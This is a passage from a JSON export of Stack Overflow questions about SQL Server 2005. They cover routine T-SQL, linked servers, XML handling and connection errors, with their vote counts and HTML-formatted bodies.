lock. Unfortunately I cannot find the exception details.</p>\n\n<p>I guess my first question is, should the EF model be used from a static single instance? Also, is it possible to remove the need for transactions in EF? I've tried using a <code>TransactionScope</code> object without success...</p>\n\n<p>To be honest I'm a lot stuck here, and cannot understand why (what should be) fairly simple operations are causing such an issue...</p>\n\n<p>Cheers,\nsicknote</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12721869,"title":"Alter a SQL server function to accept new optional parameter","body":"<p>I already have a function in SQL Server 2005 as:</p>\n\n<pre><code>ALTER function [dbo].[fCalculateEstimateDate] (@vWorkOrderID numeric)\nReturns varchar(100)  AS\nBegin\n  &lt;Function Body&gt;\nEnd\n</code></pre>\n\n<p>I want to modify this function to accept addition optional parameter @ToDate. I am going to add logic in function if @Todate Provided then do something else continue with existing code.</p>\n\n<p>I modified the function as:</p>\n\n<pre><code>ALTER function [dbo].[fCalculateEstimateDate] (@vWorkOrderID numeric,@ToDate DateTime=null)\nReturns varchar(100)  AS\nBegin\n  &lt;Function Body&gt;\nEnd\n</code></pre>\n\n<p>Now I can call function as:</p>\n\n<pre><code>SELECT dbo.fCalculateEstimateDate(647,GETDATE())\n</code></pre>\n\n<p>But it gives error on following call:</p>\n\n<pre><code>SELECT dbo.fCalculateEstimateDate(647)\n</code></pre>\n\n<p>as</p>\n\n<blockquote>\n  <p>An insufficient number of arguments were supplied for the procedure or\n  function dbo.fCalculateEstimateDate.</p>\n</blockquote>\n\n<p>which as per my understanding should not happen.</p>\n\n<p>Am I missing anything?\nThanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2152,"score":1,"question_id":2197727,"title":"connect sql server 2005/2008 over internet","body":"<p>How do I connect to SQL Server 2005/2008 using Management Studio or other desktop application over the internet?</p>\n"},{"tags":["sql-server-2005","logging","vb.net-2010","audit-trail"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12720444,"title":"The best solution for creating logging system","body":"<p>can someone tell me what the best solution is for creating logging system (Audit trail) !? \nI'm using vb.net with MSSQL 2005</p>\n"},{"tags":["c#","asp.net","sql-server-2005","activity"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":203,"score":6,"question_id":9063836,"title":"Last Activity Date - Better Ideas for implementation","body":"<p>For a typical user registration and membership system i follow in ASP.NET website i would like to update the last activity date and time. Which of the below methods would be ideal to follow.</p>\n\n<h3>1</h3>\n\n<p>Whenever a request is made to a method that access the data from the user account table, automagically(O_o)  update the <code>last_account_activity</code> date using <code>GETDATE()</code></p>\n\n<h3>2</h3>\n\n<p>Call <code>UpdateLastActivity()</code> as a method external after a method is called from the membership system.</p>\n\n<p>info:</p>\n\n<p>In terms of reliability the #2 is ideal because i can't rely in #1 when user actively using data from other tables rather than user account table.</p>\n\n<p>What do you think? U got another way for me to do it? </p>\n\n<h3>Specs</h3>\n\n<p>.NET Framework 2.0</p>\n\n<p>Asp.net 2.0</p>\n\n<p>Custom Membership Provider Implementation</p>\n\n<p>Sql Server 2005 Database</p>\n"},{"tags":["sql","sql-server-2005","foreign-key-relationship"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2205,"score":2,"question_id":3178709,"title":"Foreign key referencing a 2 columns primary key in SQL Server","body":"<p>This question is pretty much similar to <a href=\"http://stackoverflow.com/questions/953035/multiple-column-foreign-key-in-mysql\">this one</a>, but for SQL Server 2005 :</p>\n\n<p>I have 2 tables in my database:</p>\n\n<pre><code>--'#' denotes the primary key\n[Libraries]\n#ID   #Application  Name\n 1     MyApp        Title 1\n 2     MyApp        Title 2\n\n\n[Content]\n#ID   Application  LibraryID  Content\n 10    MyApp       1          xxx\n 11    MyApp       1          yyy\n</code></pre>\n\n<p>(the database is obviously much more complex and having this double key makes sense)</p>\n\n<p>Each library is identified by its unique ID and Application name. I'm trying to ensure that each content is properly referencing an existing library.</p>\n\n<p>When creating the constraint (using the Wizard) as</p>\n\n<pre><code>Primary key table            Foreign key table\n[Libraries]                  [Content]\nID                  ---&gt;     LibraryID\nApplication         ---&gt;     Application\n</code></pre>\n\n<p>I have the following error: </p>\n\n<blockquote>\n  <p>The columns in table 'Libraries' do\n  not match an existing primary key or\n  UNIQUE constraint</p>\n</blockquote>\n\n<p>Do you have any idea of what is going on? and if it's possible at all using SQL Server? (I can't modify the [Library] table at all)</p>\n\n<p>Thanks a lot for your help!</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":4988,"score":7,"question_id":4024072,"title":"How to remove accents and all chars <> a..z in sql-server?","body":"<p>I need to do the following modifications to a varchar(20) field:</p>\n\n<ol>\n<li>substitute accents with normal letters (like  to e)</li>\n<li>after (1) remove all the chars not in a..z</li>\n</ol>\n\n<p>for example</p>\n\n<pre><code>'a=.32s df' \n</code></pre>\n\n<p>must become </p>\n\n<pre><code>'aeacsdf'\n</code></pre>\n\n<p>are there special stored functions to achieve this easily?</p>\n\n<p><strong>UPDATE</strong>: please provide a T-SQL not CLR solution. This is the workaround I temporarly did because it temporarly suits my needs, anyway using a more elegant approach would be better.</p>\n\n<pre><code>CREATE FUNCTION sf_RemoveExtraChars (@NAME nvarchar(50))\nRETURNS nvarchar(50)\nAS\nBEGIN\n  declare @TempString nvarchar(100)\n  set @TempString = @NAME \n  set @TempString = LOWER(@TempString)\n  set @TempString =  replace(@TempString,' ', '')\n  set @TempString =  replace(@TempString,'', 'a')\n  set @TempString =  replace(@TempString,'', 'e')\n  set @TempString =  replace(@TempString,'', 'e')\n  set @TempString =  replace(@TempString,'', 'i')\n  set @TempString =  replace(@TempString,'', 'o')\n  set @TempString =  replace(@TempString,'', 'u')\n  set @TempString =  replace(@TempString,'', 'c')\n  set @TempString =  replace(@TempString,'''', '')\n  set @TempString =  replace(@TempString,'`', '')\n  set @TempString =  replace(@TempString,'-', '')\n  return @TempString\nEND\nGO\n</code></pre>\n"},{"tags":["sql","xml","query","sql-server-2005","xml-parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12713871,"title":"How to read a xml in SQL Server 2005?","body":"<p>I have this query</p>\n\n<pre><code>WITH XMLNAMESPACES (DEFAULT 'http://www.w3.org/2005/Atom') \nselect \ncast(idsku as int) idsku,\ncast(entregado as int) entregado from #final1 final FOR XML AUTO, ROOT ('clientesxml'), ELEMENTS \n</code></pre>\n\n<p>this return  </p>\n\n<pre><code>&lt;clientesxml xmlns=\"http://www.w3.org/2005/Atom\"&gt;\n  &lt;final&gt;\n    &lt;idsku&gt;191&lt;/idsku&gt;\n    &lt;entregado&gt;159&lt;/entregado&gt;\n  &lt;/final&gt;\n&lt;/clientesxml&gt;\n</code></pre>\n\n<p>My question how do I create a stored procedure which reads the XML returned and converts it into a <code>#tempTable</code> ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":7,"favorite_count":3,"up_vote_count":11,"down_vote_count":0,"view_count":15234,"score":11,"question_id":1488355,"title":"IF EXISTS, THEN SELECT ELSE INSERT AND THEN SELECT","body":"<p>How do you say the following in Microsoft SQL Server 2005:</p>\n\n<pre><code>IF EXISTS (SELECT * FROM Table WHERE FieldValue='') THEN\n   SELECT TableID FROM Table WHERE FieldValue=''\nELSE\n   INSERT INTO TABLE(FieldValue) VALUES('')\n   SELECT TableID FROM Table WHERE TableID=SCOPE_IDENTITY()\nEND IF\n</code></pre>\n\n<p>What I'm trying to do is to see if there is a blank fieldvalue already, and if there is then return that TableID, else insert a blank fieldvalue and return the corresponding primary key.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":11154,"score":13,"question_id":1899846,"title":"How to delete all rows from all tables in a SQL Server database?","body":"<p>How to delete all rows from all tables in a SQL Server database?</p>\n"},{"tags":["sql-server","sql-server-2005","csv","linked-server"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1569,"score":0,"question_id":5541667,"title":"Unable to access CSV file using linked server using any login other than 'sa'","body":"<p>I've set up a linked server to read a set of CSV files located locally on the SQL Server machine, as follows:</p>\n\n<pre><code>USE master\ngo\n\nIF EXISTS (SELECT * FROM sys.servers WHERE name = 'MyLink') \n    EXEC sp_dropserver 'MyLink', 'droplogins'; \n\nEXEC sp_AddLinkedServer @server     = 'MyLink', \n                        @srvproduct = '',\n                        @provider   = 'Microsoft.ACE.OLEDB.12.0', \n                        @datasrc    = 'C:\\Data\\Feeds', \n                        @provstr    = 'Text'\n\nEXEC sp_AddLinkedSrvLogin MyLink, FALSE\ngo\n</code></pre>\n\n<p>The following code then works perfectly, provided I'm logged in as 'sa' (either syntax works):</p>\n\n<pre><code>SELECT * FROM MyLink...myFile#csv\nSELECT * FROM OPENQUERY(MyLink,'select * from myFile.csv')\n</code></pre>\n\n<p>If I log in as any other user, however, I get the following error:</p>\n\n<pre><code>Msg 7416, Level 16, State 2, Line 1\nAccess to the remote server is denied because no login-mapping exists.\n</code></pre>\n\n<p>Trying to change the remote login, either via script, or by modifying the linked server properties in SSMS to add a mapping, not only doesn't work but also breaks the ability of 'sa' to run the select statements.</p>\n\n<p>BTW, I'm trying to work around a <a href=\"http://connect.microsoft.com/SQLServer/feedback/details/127114/flat-file-source-incorrectly-parsing-data-when-using-comma-as-the-column-delimiter\" rel=\"nofollow\">known bug</a> in SSIS where it cannot handle CSV with commas inside double-quote-delimited fields.  I stumbled across <a href=\"http://www.sqlservercentral.com/Forums/Topic559811-149-1.aspx#bm559856\" rel=\"nofollow\">this post</a> which describes using a linked server to get around the problem without having to code a custom parsing routine.  Works great, except for the whole security thing; I don't want my application connecting as 'sa'.  I'm using SQL 2005 SP3.</p>\n\n<p>Any ideas on getting this to work with a run-of-the-mill login?</p>\n\n<p>TIA,\nJim</p>\n\n<p>@JustinStolle When I set it up as you describe, I get a different error for the non-sa user (sa still seems to work):</p>\n\n<p>OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\" returned message \"Cannot start your application. The workgroup information file is missing or opened exclusively by another user.\".\nMsg 7399, Level 16, State 1, Line 1\nThe OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\" reported an error. Authentication failed.\nMsg 7303, Level 16, State 1, Line 1\nCannot initialize the data source object of OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\".</p>\n\n<p>I can't import the file; SSIS can't handle it.</p>\n"},{"tags":["c#",".net","sql-server-2005","linq-to-sql","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12607393,"title":"How to send string-named arguments to a stored procedure?","body":"<p>I have a stored procedure with a large number of parameters (>50), the vast majority of which are optional. I would like to be able to call it like this:</p>\n\n<pre><code>var result = context.MySproc(\n               new Dictionary&lt;string, string&gt;()\n               {\n                   {\"foo\",\"bar\"},\n                   {\"baz\",\"xyzzy\"}\n               });\n</code></pre>\n\n<p>The parameters needed will vary dynamically.</p>\n\n<p>The DB call must be a stored procedure (not up to me), and it must use the existing <code>DataContext</code> rather than setting up a new connection.</p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","asp.net-4.0","asp.net-3.5"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":138,"score":1,"question_id":12660926,"title":"Add Column in Grid view according to SQL query","body":"<p>I am using this query:</p>\n\n<pre><code>select EmployeeId, receptionist_name, date_of_sale,\n  count(date_of_sale) \nfrom FrontOffice \ngroup By EmployeeId, receptionist_name, date_of_sale \norder by date_of_sale\n</code></pre>\n\n<p>for filling the grid view. But I can bound the <code>EmployeeId</code>, <code>receptionist_name</code>, <code>date_of_sale</code>, so can you tell me how can I bound the 4th column in grid view and how to fill the grid view.</p>\n\n<p><strong>UPDATE:</strong> Here is the code I am using:</p>\n\n<pre><code>&lt;Columns&gt; \n    &lt;asp:BoundField HeaderText=\"Date\" DataField=\"date_of_sale\" /&gt; \n    &lt;asp:BoundField HeaderText=\"Employe Id\" DataField=\"EmployeeId\" /&gt; \n    &lt;asp:BoundField HeaderText=\"Receiptist Name\" DataField=\"receptionist_name\" /&gt; \n    &lt;asp:TemplateField HeaderText=\"No. of Prospectus Sale\"&gt; \n    &lt;ItemTemplate&gt; \n        &lt;asp:Label ID=\"salecount\" runat=\"server\" \n          Text='&lt;%# Eval(\"SaleCount\") %&gt;'&gt;&lt;/asp:Label&gt; \n    &lt;/ItemTemplate&gt; \n    &lt;/asp:TemplateField&gt; \n&lt;/Columns&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005","alert","jobs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12703715,"title":"SQL Server 2005 Job - Trigger Alert","body":"<p>How to Schedule jobs on the database that checks for an alert condition (must be configurable/dynamic).</p>\n\n<p>If there is change in the database data or if the values in a column fall in a range of values that are provided as input, I want the alert to be scheduled that will sent alert as email</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12706287,"title":"SQL Server varchar equality test gives syntax error","body":"<p>I have a simple table running in SQL Server 2005 defined as</p>\n\n<pre><code>CREATE TABLE [dbo].[ap_purchases_tax_det](\n[invoice_s] [int] NOT NULL,\n[line_num] [smallint] NOT NULL,\n[tax_code] [varchar](10) NOT NULL,\n[tax_type] [varchar](2) NULL,\n[tax_det_s] [int] IDENTITY(1,1) NOT NULL,\n[old_entity] [varchar](14) NULL,\n[old_cc_code] [varchar](5) NULL,\n[old_vendor] [varchar](15) NULL,\n[old_invoice] [varchar](20) NULL,\n[citi] [varchar](1) NULL,\nCONSTRAINT [aaaaaap_purchases_tax_det_PK] PRIMARY KEY NONCLUSTERED \n(\n    [invoice_s] ASC,\n    [line_num] ASC,\n    [tax_code] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>The tax_type field is filled with either 'W', 'V', 'B\", or '' (this one is not NULL).</p>\n\n<p>I need to get a boolean flag if tax_type is 'W', so I have the SQL:</p>\n\n<pre><code>select iif(tax_type = 'W',1,0) FROM dbo.ap_purchases_tax_det;\n</code></pre>\n\n<p>when I run this I get \"Incorrect syntax near '='.\".  This occurs even for a simple <code>tax_type = 'W'</code>.  The test for equality seems to work in the WHERE clause, but I need a flag, which means I would have to UNION together 2 selects.  This is actually part of a join that is a subquery in much larger statement so I don't want to do this.  I have tried excplicitly casting <code>tax_type = cast('W' as varchar(2))</code> to no avail. Same results if I use <code>ISNULL(tax_type,'x')</code>.</p>\n\n<p>I have no idea why the test for equality is not working, can someone provide guidance?</p>\n"}]}
{"total":14387,"page":6,"pagesize":100,"questions":[{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12703549,"title":"SQL Server 2005 : map Transaction_ID to @@SPID","body":"<p>Is there anyway to map <code>transaction_id</code> from somewhere like <code>sys.dm_tran_active_transactions</code>to an <code>SPID</code> in SQL Server 2005?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":9518108,"title":"travel database","body":"<p>I'm creating travel module for my project, which contain predefine 5 packages \nfor travel places, and also have 10 Vans(5 Ac and 5 nonAc), 10 mini buses, 5 Volvo buses(AC), </p>\n\n<p>and all charges for travel packages with each vechile is predefin,</p>\n\n<p>So how can i prepared database table for travel module?</p>\n\n<p>M creating three tables:</p>\n\n<pre><code>Travel(travel_id(foreignkey),\nnoofmembers,\nbookdate,vechiletype,acornonac)\n</code></pre>\n\n<p>travel_details</p>\n\n<pre><code>travelid(primarykey),\ntravelpackageid(foreignkey),\n(vechiletype(ac or nonac),\nvechilerate(with package charge),\nvechilestatus(a or na)\n</code></pre>\n\n<p>travel_package</p>\n\n<pre><code>travelpackageid(primarykey),\ntravelpackage\n</code></pre>\n"},{"tags":["linux","sql-server-2005","plesk","mediatemple","dedicated-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12684935,"title":"enable php-mssql on plesk 11 linux server(Media Temple)","body":"<p>I need to connect to both mssql and MySQL using php. so I tried to enable extension php-mssql using yum install my-mssql, when I have PHP 5 support, it says php-api missing. And get suggested to using php5.3 instead, after I switch, it get error php54-common is conflicted with php-common. </p>\n"},{"tags":["tsql","sql-server-2005","cross-apply"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12681579,"title":"Cross Apply of UDF missing Results","body":"<p>I am performing a SQL query similar to the following</p>\n\n<pre><code>SELECT fn.FullName, pn.LastName, pn.FirstName, pn.MI\nFROM Source.dbo.tblPerson fn\n    cross apply dbo.ParseFullName(fn.FullName) pn\n</code></pre>\n\n<p>the result looks fine for the first 85 rows the 86th+ always have NULL for columns derived from the UDF. If I add a where or order by clause to change the result set, it is always the first 85 rows that return the complete set of results. because the 85 number is so consistent, I am thinking that it is something that I am overlooking.</p>\n\n<p>Any help that anyone can provide would be great</p>\n"},{"tags":["sql","sql-server","sql-server-2005","row-number"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12695858,"title":"How do to the opposite of \"row_number() over (partition by [Col] order by [Col])\"","body":"<p>I am trying to combine duplicate entries in a data table and give them a new number.</p>\n\n<p>Here is a example data set (<a href=\"http://data.stackexchange.com/stackoverflow/query/81485/query-for-http-stackoverflow-com-questions-12695858?opt.textResults=true\" rel=\"nofollow\">runnable copy</a>)</p>\n\n<pre><code>declare @tmpTable table\n    (ID Varchar(1), \n     First varchar(4), \n     Last varchar(5), \n     Phone varchar(13),\n     NonKeyField varchar(4))\n\ninsert into @tmpTable select 'A', 'John', 'Smith', '(555)555-1234', 'ASDF'\ninsert into @tmpTable select 'B', 'John', 'Smith', '(555)555-1234', 'GHJK'\ninsert into @tmpTable select 'C', 'Jane', 'Smith', '(555)555-1234', 'QWER'\ninsert into @tmpTable select 'D', 'John', 'Smith', '(555)555-1234', 'RTYU'\ninsert into @tmpTable select 'E', 'Bill', 'Blake', '(555)555-0000', 'BVNM'\ninsert into @tmpTable select 'F', 'Bill', 'Blake', '(555)555-0000', '%^&amp;*'\ninsert into @tmpTable select 'G', 'John', 'Smith', '(555)555-1234', '!#RF'\n\nselect row_number() over (partition by First, Last, Phone order by ID) NewIDNum, *  \nfrom @tmpTable order by ID\n</code></pre>\n\n<p>Right now it gives me the results </p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n2                    B    John  Smith (555)555-1234 GHJK\n1                    C    Jane  Smith (555)555-1234 QWER\n3                    D    John  Smith (555)555-1234 RTYU\n1                    E    Bill  Blake (555)555-0000 BVNM\n2                    F    Bill  Blake (555)555-0000 %^&amp;*\n4                    G    John  Smith (555)555-1234 !#RF\n</code></pre>\n\n<p>However that is the opposite of what I want, the <code>NewIDNum</code> resets its counter ever time it finds a new combination of the key. I want all of the same combination to have the same ID. So if it was behaving the way I wanted I would get the following results</p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n1                    B    John  Smith (555)555-1234 GHJK\n2                    C    Jane  Smith (555)555-1234 QWER\n1                    D    John  Smith (555)555-1234 RTYU\n3                    E    Bill  Blake (555)555-0000 BVNM\n3                    F    Bill  Blake (555)555-0000 %^&amp;*\n1                    G    John  Smith (555)555-1234 !#RF\n</code></pre>\n\n<p>What is the correct way to get the results I want?</p>\n\n<hr>\n\n<p><strong>I did not include this requirement in the original post</strong>:  I need the <code>NewIDNum</code> to produce the same numbers on subsequent runs of this query for the existing rows if more rows get added (assuming all new rows will have a higher ID \"value\" if a order by is done on the ID column)</p>\n\n<p>So if at a latter date the following was done</p>\n\n<pre><code>insert into @tmpTable select 'H', 'John', 'Smith', '(555)555-1234', '4321'\ninsert into @tmpTable select 'I', 'Jake', 'Jons', '(555)555-1234', '1234'\ninsert into @tmpTable select 'J', 'John', 'Smith', '(555)555-1234', '2345'\n</code></pre>\n\n<p>running the correct query again would give</p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n1                    B    John  Smith (555)555-1234 GHJK\n2                    C    Jane  Smith (555)555-1234 QWER\n1                    D    John  Smith (555)555-1234 RTYU\n3                    E    Bill  Blake (555)555-0000 BVNM\n3                    F    Bill  Blake (555)555-0000 %^&amp;*\n1                    G    John  Smith (555)555-1234 !#RF\n1                    H    John  Smith (555)555-1234 4321\n4                    I    Jake  Jons  (555)555-1234 1234\n1                    J    John  Smith (555)555-1234 2345\n</code></pre>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1805,"score":3,"question_id":1038245,"title":"SQL Pivot based on value between two columns","body":"<p>I have a table in which I have, among other things, two columns, one for start date and another for end date.  I need to write a query that will return a column for each month of the year and the value of that column is 1 if the month is between 0 otherwise.  The PIVOT statement seems to be what I am looking for here, but from the best I can tell the PIVOT clause is looking to match values, not check if value is between two others.  Is the PIVOT clause the right construct here, or do I need to break down and write 12 case statements and then aggregate those?</p>\n"},{"tags":["sql-server-2005","maintenance"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4973,"score":2,"question_id":987147,"title":"SQL 2005 Maintenance Cleanup Task .bak files not being deleted","body":"<p>I have a SQL 2005 Maintenance plan that runs a backup to create a .bak file, and, on successful completion is supposed to run a Maintenance Clean Up task to delete any .bak files in the folder the back up task saves to that are older than 5 days. </p>\n\n<p>My backups are being created, but my old files aren't being deleted. I don't see any errors in the log. I think that perhaps I have a permissions issue -- that the account the job is run under needs access to the folder the .bak files are to be deleted from. Does this seem like a likely cause of .bak files not being deleted?</p>\n\n<p>How do I find out what account the job is run under? I'm guessing it would be the SQL Agent account. I thought that would be the account named 'SQLServer2005AgentUser' so I tried giving that account full control, but my .bak files are still not being deleted. </p>\n\n<p>Should I take a different approach to cleaning up the old files? Or is there something else I'm doing wrong or not understanding?</p>\n"},{"tags":["sql","sql-server","string","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12685862,"title":"Looking for multiples substrings within a SQL string","body":"<p>I have several occurrences of differences strings in the columns, like this example</p>\n\n<p><code>'dsasdasdsd'+'ewewewew'+'45454545'+(avg('uuuuuuu'))</code></p>\n\n<p>I need to split this string into several columns with the substrings that are between \naphostropes</p>\n\n<p>like this:</p>\n\n<pre><code>Column 1 = dsasdasdsd\nColumn 2 = ewewewew\nColumn 3 = 45454545\nColumn 4 = uuuuuuu\n</code></pre>\n\n<p>The numbers of apperances are random, thefore the length of the original column is also not fixed (from 50 char to > 1000)</p>\n"},{"tags":[".net","xml","tsql","sql-server-2005","xml-parsing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12688828,"title":"Normalising XML in SQLServer for hashing","body":"<p>I asked <a href=\"http://stackoverflow.com/q/12674327/395628\">this question</a> which led me to do the following.</p>\n\n<ul>\n<li>Create an XML representation of a C# object structure in order to pass it to SQLServer.</li>\n<li>Create a stored procedure which <em>hashes the XML</em> and then shreds the XML into related tables and also stores the hash in the root table for quick lookup.</li>\n</ul>\n\n<p>This means that I can pass complex object data to SQLServer and do a lookup on the hash rather than trying to shred and match the XML against the tables (which I can also do but is slow(er))...</p>\n\n<p>However - One of the nice things about XML is that you can format it eg indent it etc - and also - that attribute order is not important. BUT when you hash something formatting and indentation IS important. So what I do in C# is...</p>\n\n<ul>\n<li>Normalise the XML by putting all attributes in alphabetical order</li>\n<li>use .ToString(DisableFormatting) to remove extra formatting spaces</li>\n</ul>\n\n<p>This works fine, but when I'm testing it's easier to have <em>formatted</em> XML so I can see more easily what I'm passing to the stored proc.</p>\n\n<p>It would be nice if SQLServer could be trusted to preserve attribute order <a href=\"http://msdn.microsoft.com/en-us/library/ms187107%28v=sql.90%29.aspx\" rel=\"nofollow\">but it can't</a>...</p>\n\n<blockquote>\n  <p>The order of attributes in an XML instance is not preserved. When you\n  query the XML instance stored in the xml type column, the order of\n  attributes in the resulting XML may be different from the original XML\n  instance.</p>\n</blockquote>\n\n<p>This means that I can't use SQLServer's XML datatype to normalise the data.</p>\n\n<p>What bothers me is that at some point someone will be using my procs and think \"oh great, XML, attribute order doesn't matter, formatting doesn't matter, <em>the data represented is the same</em>\" However, when I hash this isn't going to be the case.</p>\n\n<p>Anyone got any solutions to this problem? I don't really want to write an XML parser in T-SQL!! Or use an XML parser someone else has written in order to normalise it. Why can't the SQLServer XML datatype just preserve attribute order? </p>\n\n<p>I suppose I can \"trust\" my app to always pass XML in the same format/order thus resulting in the same hash for the same object. But I'm uncomfortable with the idea that the stored proc has to also \"trust\" the app to do this. I would like to somehow be able to check the normalisation of the XML, it will obviously be more robust like that.</p>\n"},{"tags":["c++","sql-server-2005","bind","bcp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12361882,"title":"Sending null values to an integer column in an SQL table from a C++ application","body":"<p>I am doing a bulk copy of program variables to a SQL Server 2005 table and I use <code>bcp_bind</code> and <code>bcp_sendrow</code> in a C++ application</p>\n\n<p>However, some of the integer columns in the table allow <code>null</code> values. I'm not quite sure how I should be sending <code>null</code> values at runtime using <code>bcp_sendrow</code> when the need arises to send a <code>null</code> value for one of the columns.</p>\n\n<p><a href=\"http://technet.microsoft.com/en-us/library/aa177853%28v=sql.80%29.aspx\" rel=\"nofollow\">Documentation</a> on <code>bcp_bind</code> says:</p>\n\n<blockquote>\n  <p>To bulk copy a row to the server containing a NULL value for the bound\n  column, the value of the instance's iIndicator member should be set to\n  SQL_NULL_DATA</p>\n</blockquote>\n\n<p>However this still doesn't make things quite clear. Am I supposed to have 2 different calls to <code>bcp_sendrow</code>: one for the not null case and another for the null case?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12682626,"title":"Simple INSERT Query in SQL Server","body":"<p>I m looking to a way to insert into database Table T1 from T2 (append operation_</p>\n\n<p>Table 1 : dbo.t1</p>\n\n<pre><code>col1   col2\n----   -----\n1       ABC\n2       ABCr  \n3       ABCs\n4       ABCd\n</code></pre>\n\n<p>Table 2 : dbo.t2</p>\n\n<pre><code>col1   col2\n----   -----\n7       ABCe\n8       ABCy  \n</code></pre>\n\n<p>Now , table 1 becomes</p>\n\n<pre><code>col1   col2\n----   -----\n1       ABC\n2       ABCr  \n3       ABCs\n4       ABCd\n7       ABCe\n8       ABCy  \n</code></pre>\n\n<p>SQL query , I m using is:</p>\n\n<pre><code>select * \ninto dbo.t1\nfrom dbo.t2\n</code></pre>\n\n<p>I know it would way too simple using #temp table.</p>\n\n<p>I m looking for a way so that I just append the rows from T2 to T1 and keep performance as well. The existing rows of T1 is not touch at all.</p>\n\n<p>Any help would be helpful.</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":55,"score":-3,"question_id":8054884,"title":"SQL server retrieve data from table","body":"<pre><code>TABLE\n: Customer \nKEY\n:- CustomerID \nOther\ncolumns: Name, age, etc TABLE\n: Customer_address \nKeys\n: AddrerssID, CustomerID \nOther\ncolumns: Street, city, STATE, etc\n</code></pre>\n\n<p>Please give me ALL customers.\nI also want to see the customer address if the <code>state = FL</code>. Only create one SQL statement. The SQL below starts this way. Please fill in the rest.</p>\n"},{"tags":["php","sql-server-2005","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":148,"score":0,"question_id":11225222,"title":"PHP SQL Server 2005 Standard Edition connection timeout","body":"<p>I've searched through endless solutions for connection problems with PHP and SQL Server 2005 and still no luck. I'm using SQL Server 2005 Standard Edition.<br>\nHere's the code:</p>\n\n<pre><code>$server = \"MYLAP01\\\\SQLEXPRESS\";\n$options = array(\"Database\" =&gt; \"test1\");\n$conn = sqlsrv_connect($server, $options);\n\nif ($conn === false) die(\"&lt;pre&gt;\".print_r(sqlsrv_errors(), true));echo \"Successfully connected!\";\n\nsqlsrv_close($conn);\n</code></pre>\n\n<p>And the output:</p>\n\n<pre>Array\n(\n    [0] => Array\n        (\n            [0] => 08001\n            [SQLSTATE] => 08001\n            [1] => -1\n            [code] => -1\n            [2] => [Microsoft][SQL Server Native Client 11.0]SQL Server Network Interfaces: Error Locating Server/Instance Specified [xFFFFFFFF]. \n            [message] => [Microsoft][SQL Server Native Client 11.0]SQL Server Network Interfaces: Error Locating Server/Instance Specified [xFFFFFFFF]. \n        )\n\n    [1] => Array\n        